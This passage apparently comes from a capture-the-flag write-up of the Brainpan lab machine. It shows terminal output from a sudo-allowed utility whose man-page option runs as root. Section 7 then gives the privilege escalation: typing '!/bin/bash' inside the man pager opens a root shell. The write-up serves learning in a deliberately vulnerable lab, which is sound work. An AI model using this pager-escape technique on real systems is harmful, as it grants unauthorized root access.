    inet6 fd8c:4635:b5e0:0:e873:c230:e822:4a3a/64 scope global temporary dynamic 
       valid_lft 597931sec preferred_lft 78931sec
    inet6 fd8c:4635:b5e0:0:20c:29ff:fe87:515c/64 scope global dynamic 
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe87:515c/64 scope link 
       valid_lft forever preferred_lft forever
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
sudo /home/anansi/bin/anansi_util proclist
'unknown': unknown terminal type.
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual whoami
sudo /home/anansi/bin/anansi_util manual whoami
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
WHOAMI(1)                        User Commands                       WHOAMI(1)

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print  the  user  name  associated  with the current effective user ID.
       Same as id -un.

       --help display this help and exit

       --version
              output version information and exit

AUTHOR
       Written by Richard Mlynarik.

REPORTING BUGS
       Report whoami bugs to bug-coreutils@gnu.org
       GNU coreutils home page: <http://www.gnu.org/software/coreutils/>
 Manual page whoami(1) line 1 (press h for help or q to quit)q
```
So basically this is some simple tool that lets the users run certain commands to view interfaces, process lists (even though it didn't work for me) and view manpages. The manual command seems the most interesting for privilege escalation - I imagine it is possible that behind the scenes it is simply running "man" with whatever command we give it appended to the front. After some experiementation it appears the manual command doesn't process arguments, and will just loop through and get the manpage for every commend seperated by spaces. Still if it is using manual, I can escalate from within it.

### 7. Escalate to root
I can just get the manual for any command, then run an external program by using the '!' character prepeneded. The command will run in the context of whatever man is running as, which in this case is root.
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual whoami
sudo /home/anansi/bin/anansi_util manual whoami
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man# whoami
root
```